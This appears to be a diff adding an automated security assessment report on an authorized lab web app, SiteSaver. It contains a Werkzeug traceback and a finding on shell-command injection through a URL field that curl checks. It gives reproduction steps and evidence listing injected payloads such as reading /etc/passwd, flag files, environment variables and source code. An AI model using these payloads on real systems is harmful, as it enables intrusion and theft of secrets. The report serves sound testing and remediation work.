+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self,&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;rv: ft.ResponseReturnValue | HTTPException,&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661389392&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;880&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;request_started.send(self, _async_wrapper=self.ensure_sync)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if rv is None:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;rv = self.dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.handle_user_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.finalize_request(rv)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def finalize_request(&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661389504&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;865&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;and req.method == &amp;#34;OPTIONS&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;):&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;return self.make_default_options_response()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;# otherwise dispatch to the handler for that endpoint&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def full_dispatch_request(self) -&amp;gt; Response:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;Dispatches the request and on top of that performs request&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;pre and postprocessing as well as HTTP exception catching and&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;error handling.&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661389616&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/app/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;28&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;add_url&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source &quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;@app.route(&amp;#39;/add_url&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;])&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;def add_url():&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;if request.method == &amp;#39;POST&amp;#39;:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;url = request.form[&amp;#39;url&amp;#39;]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;response = check_url(url)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;print(response)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;if &amp;#39;200&amp;#39; in response:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;new_url = URL(url=url)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;db.session.add(new_url)&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131185661389728&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;196&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;__getitem__&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;if key in self:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;lst = dict.__getitem__(self, key)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;if len(lst) &amp;gt; 0:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;return lst[0]&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;raise exceptions.BadRequestKeyError(key)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;def __setitem__(self, key, value):&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;Like :meth:`add` but removes an existing key first.&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;:param key: the key for the value.&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/ul&gt;
+  &lt;blockquote&gt;werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;url&amp;#39;
+&lt;/blockquote&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;plain&quot;&gt;
+    &lt;p&gt;
+      This is the Copy/Paste friendly version of the traceback.
+    &lt;/p&gt;
+    &lt;textarea cols=&quot;50&quot; rows=&quot;10&quot; name=&quot;code&quot; readonly&gt;Traceback (most recent call last):
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/flask/app.py&amp;#34;, line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File &amp;#34;/app/app.py&amp;#34;, line 28, in add_url
+    url = request.form[&amp;#39;url&amp;#39;]
+  File &amp;#34;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&amp;#34;, line 196, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;url&amp;#39;
+&lt;/textarea&gt;
+&lt;/div&gt;
+&lt;div class=&quot;explanation&quot;&gt;
+  The debugger caught an exception in your WSGI application.  You can now
+  look at the traceback which led to the error.  &lt;span class=&quot;nojavascript&quot;&gt;
+  If you enable JavaScript you can also use additional features such as code
+  execution (if the evalex feature is enabled), automatic pasting of the
+  exceptions and much more.&lt;/span&gt;
+&lt;/div&gt;
+      &lt;div class=&quot;footer&quot;&gt;
+        Brought to you by &lt;strong class=&quot;arthur&quot;&gt;DON'T PANIC&lt;/strong&gt;, your
+        friendly Werkzeug powered traceback interpreter.
+      &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;div class=&quot;pin-prompt&quot;&gt;
+      &lt;div class=&quot;inner&quot;&gt;
+        &lt;h3&gt;Console Locked&lt;/h3&gt;
+        &lt;p&gt;
+          The console is locked and needs to be unlocked by entering the PIN.
+          You can find the PIN printed out on the standard output of your
+          shell that runs the server.
+        &lt;form&gt;
+          &lt;p&gt;PIN:
+            &lt;input type=text name=pin size=14&gt;
+            &lt;input type=submit name=btn value=&quot;Confirm Pin&quot;&gt;
+        &lt;/form&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!--
+
+Traceback (most recent call last):
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1476, in wsgi_app
+    response = self.handle_exception(e)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+  File &quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;, line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+  File &quot;/app/app.py&quot;, line 28, in add_url
+    url = request.form['url']
+  File &quot;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&quot;, line 196, in __getitem__
+    raise exceptions.BadRequestKeyError(key)
+werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: 'url'
+
+
+--&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 5. [workflow-bypass] Validation bypass: unreachable/arbitrary URLs persisted to the &quot;validated&quot; list (POST /add_url -&gt; GET /)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5094/</div>
+<div class="desc">SiteSaver's core business rule is that a URL is only saved if it &quot;returns a 200 OK status&quot; when the server validates it. There is no URL-format validation whatsoever; the sole gate is the Python check `'200' in response`, where `response` is the stdout of `curl -o /dev/null -s -w &quot;%{http_code}&quot; &quot;&lt;url&gt;&quot;`. Because the `url` value is injected into that shell command (see f-004), an attacker can forge the gate: submitting url=`http://&lt;host&gt;.invalid&quot;; echo 200 #` makes curl fail (http_code 000) yet the appended `echo 200` puts &quot;200&quot; in the captured output, so the app treats the unreachable URL as validated and persists it. It then appears on the home listing (GET /) as a &quot;saved&quot; (implicitly validated) site. This defeats the application's integrity guarantee: the &quot;validated URLs&quot; list can be poisoned with URLs that were never reachable or that point to attacker-controlled/malicious destinations, while still being presented to users as checked/reliable. Confirmed as a multi-step flow: control submits a bogus URL (not saved, absent from the listing); exploit submits the forged-200 variant (saved, present in the listing on both replays). Root cause is the same unsanitised shell interpolation as the RCE (f-004); remediation (do not build the command from raw input / use a real HTTP client + strict status parsing) fixes both. Reported separately to capture the business-rule/data-integrity impact of the multi-step add-&gt;list workflow.</div>
+<div><b>Reproduction</b></div><pre>1. Control: POST /add_url body url=http://ctrlaaa111.invalid (unreachable) =&gt; &quot;Error in saving URL..&quot;; GET / =&gt; ctrlaaa111 NOT present.
+2. Exploit: POST /add_url body url=http%3A%2F%2Fpwnbbb222.invalid%22%3B%20echo%20200%20%23 (decodes to http://pwnbbb222.invalid&quot;; echo 200 #) =&gt; &quot;...returned 000200 status, Saved successfully!&quot;; GET / =&gt; the pwnbbb222.invalid entry IS present in the saved list (marker pwnbbb222), i.e. an unreachable URL bypassed the 200-OK validation.
+Confirmed via probe_scenario: control marker absent, exploit marker present x2. Evidence: negativeControl ev-mr2wqh6w-39; positiveReplays ev-mr2wqhox-3b, ev-mr2wqi7f-3d.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2wqh6w-39</code> — <code>artifacts/_/ev-mr2wqh6w-39/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 10163
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 02:50:48 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;View Saved Sites&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark&quot;&gt;
+        &lt;div class=&quot;container-fluid&quot;&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;SiteSaver&lt;/a&gt;
+            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+            &lt;/button&gt;
+            &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+                &lt;ul class=&quot;navbar-nav&quot;&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; aria-current=&quot;page&quot; href=&quot;/add_url&quot;&gt;Add Site &lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; href=&quot;/&quot;&gt;View Saved Sites&lt;/a&gt;
+                    &lt;/li&gt;
+                &lt;/ul&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+&lt;div class=&quot;container mt-4&quot;&gt;
+    &lt;h1&gt;Site Saver&lt;/h1&gt;
+    &lt;p&gt;
+        Save your favorite websites here. We ensure that your URLs are correct by checking them before saving them. Our service sends requests to the URLs you provide to ensure they are valid.
+    &lt;/p&gt;
+    
+    
+
+
+    &lt;a href=&quot;/add_url&quot; class=&quot;btn btn-primary mb-3&quot;&gt;Add URL&lt;/a&gt;
+
+    &lt;ul class=&quot;list-group&quot;&gt;
+        
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat flag.txt #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/5&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat flag.txt #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/8&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://127.0.0.1:5003/add_url
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/9&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://127.0.0.1:5003/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/10&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/11&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://target.local:5094/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/12&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://target.local:5094/add_url
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/13&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://target.local:5094/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/14&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://target.local:5094/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/15&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/16&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://$(echo${IFS}example).org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/17&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://$(echo${IFS}example).org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/18&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://$(echo${IFS}example).org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/19&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://$(echo${IFS}example).org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/20&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; sleep 8 #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/21&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.org/
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/22&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; sleep 20 #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/23&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; false #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/24&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; true #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/25&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; printf &amp;#39;\xff\xfe&amp;#39; #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/26&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; id #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/27&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat /etc/passwd #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/28&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat flag.txt #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/29&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat /etc/passwd #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/30&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; pwd; ls -la; cat flag* /flag* /app/flag* /root/flag* 2&amp;gt;/dev/null #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/31&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat app.py #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/32&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+        &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+            http://example.com&amp;#34;; cat Dockerfile; env #
+            &lt;form method=&quot;post&quot; action=&quot;/delete_url/33&quot;&gt;
+                &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger btn-sm&quot;&gt;Delete&lt;/button&gt;
+            &lt;/form&gt;
+        &lt;/li&gt;
+        
+    &lt;/ul&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2wqhox-3b</code> — <code>artifacts/_/ev-mr2wqhox-3b/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:5094
+user-agent: verdict-scanner/0.1
